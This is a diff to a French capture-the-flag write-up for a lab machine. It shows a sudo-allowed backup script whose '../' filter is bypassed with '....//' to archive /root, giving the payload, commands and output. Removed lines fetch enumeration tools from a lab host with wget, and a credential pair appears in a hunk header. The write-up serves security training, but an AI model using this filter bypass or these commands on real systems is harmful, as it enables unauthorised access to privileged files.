@@ -821,111 +821,173 @@ martin:nafeelswordsmaster
 ### Sudo -l
 Tu commences toujours par vérifier les droits sudo :
 
-### Exploration du contexte utilisateur
+```bash
+martin@code:~$ sudo -l
+Matching Defaults entries for martin on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
+User martin may run the following commands on localhost:
+    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
+martin@code:~$
+```
+
+### Analyse de /usr/bin/backy.sh
+
+Tu affiches le contenu du script autorisé par `sudo` :
 
 ```bash
-whoami
-id
-pwd
-uname -a
-hostname
+ cat /usr/bin/backy.sh
 ```
 
-Résultat :
-
-### Recherche de binaires SUID
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
+Le script conttient :
 
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+#!/bin/bash
+
+if [[ $# -ne 1 ]]; then
+    /usr/bin/echo "Usage: $0 <task.json>"
+    exit 1
+fi
+
+json_file="$1"
+
+if [[ ! -f "$json_file" ]]; then
+    /usr/bin/echo "Error: File '$json_file' not found."
+    exit 1
+fi
+
+allowed_paths=("/var/" "/home/")
+
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+
+/usr/bin/echo "$updated_json" > "$json_file"
+
+directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')
+
+is_allowed_path() {
+    local path="$1"
+    for allowed_path in "${allowed_paths[@]}"; do
+        if [[ "$path" == $allowed_path* ]]; then
+            return 0
+        fi
+    done
+    return 1
+}
+
+for dir in $directories_to_archive; do
+    if ! is_allowed_path "$dir"; then
+        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
+        exit 1
+    fi
+done
+
+/usr/bin/backy "$json_file"
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
+Le script attend un fichier JSON en argument, vérifie son existence, puis lit la clé `directories_to_archive`.
 
-```texte
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgrp
-...
-```
-
-Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
-
-### Analyse des Linux capabilities
-
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
-
-La vérification se fait avec la commande suivante :
+Avant d’effectuer la vérification des chemins, il applique une transformation avec `jq` :
 
 ```bash
-getcap -r / 2>/dev/null
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
 ```
 
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+Cette ligne supprime les occurrences de `../` dans les chemins fournis. L’objectif est d’empêcher une traversée de répertoires classique vers des emplacements sensibles comme `/root`.
 
-### Vérification des SUID avec suid3num.py
-
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
-
-les binaires SUID intéressants
-leur présence éventuelle dans GTFOBins
-
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
+Ensuite, le script vérifie que chaque chemin commence par `/var/` ou `/home/` :
 
 ```bash
-cd /dev/shm
-wget http://10.10.x.x:8000/suid3num.py
-python3 suid3num.py
+allowed_paths=("/var/" "/home/")
 ```
-L’outil confirme que :
 
-- tous les binaires SUID présents sont standards
-- aucun binaire personnalisé n’est identifié
-- aucun binaire exploitable via GTFOBins n’est détecté
-  
-
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
-
-### Inspection des tâches cron
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
-
-Les crons système peuvent être consultés avec :
+Si tous les chemins passent cette vérification, le fichier JSON modifié est transmis au binaire exécuté en root :
 
 ```bash
-cat /etc/crontab
+/usr/bin/backy "$json_file"
 ```
 
-### Analyse des services locaux
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
+Le script tente de bloquer les traversées de répertoires en supprimant les occurrences exactes de `../` :
+
+```bash
+updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")
+```
+
+Mais ce filtrage peut être contourné avec une séquence comme :
+
+```bash
+....//
+```
+
+Après suppression de `../`, cette chaîne devient :
+
+```bash
+../
+```
+
+Ainsi, le chemin :
+
+```bash
+/home/martin/....//....//root
+```
+
+est transformé en :
+
+```bash
+/home/martin/../../root
+```
+
+Le chemin commence toujours par `/home/`, donc il passe la vérification du script. Mais une fois résolu par le système de fichiers, il pointe en réalité vers :
+
+```bash
+/root
+```
+
+Ce contournement permet donc de sauvegarder `/root`.
+
+### Création de ton backups/mytask.json
+
+Tu commences par créer ton propre fichier `mytask.json` à partir du fichier existant :
+
+```bash
+cp backups/task.json backups/task.json.bak
+```
+
+Tu modifies les lignes `directories_to_archive` et `destination` :
+
+```python
+"directories_to_archive": ["/home/martin/....//....//root"],
+"destination": "/dev/shm"
+```
+
+### backup de /root
+
+Tu peux ensuite lancer `backy.sh` avec les privilèges root et ton backups/mytask.json :
 
 ```
-netstat -tulpn
+sudo /usr/bin/backy.sh backups/mytask.json
 ```
 
-### pspy64
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
+Le script confirme alors qu’il archive en réalité le répertoire `/root` :
 
-Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
+```
+2026/05/11 14:57:07 🍀 backy 1.2
+2026/05/11 14:57:07 📋 Working with backups/mytask.json ...
+2026/05/11 14:57:07 💤 Nothing to sync
+2026/05/11 14:57:07 📤 Archiving: [/home/martin/../../root]
+2026/05/11 14:57:07 📥 To: /dev/shm ...
+2026/05/11 14:57:07 📦
+```
 
-cd /var/tmp
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
+Une archive contenant le contenu de `/root` est alors créée dans `/dev/shm`.
 
-L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
+### Téléchargement du backup /root
 
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
 
-### Conclusion de l’énumération manuelle
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
+### root.txt
+
+
 
 ---
 
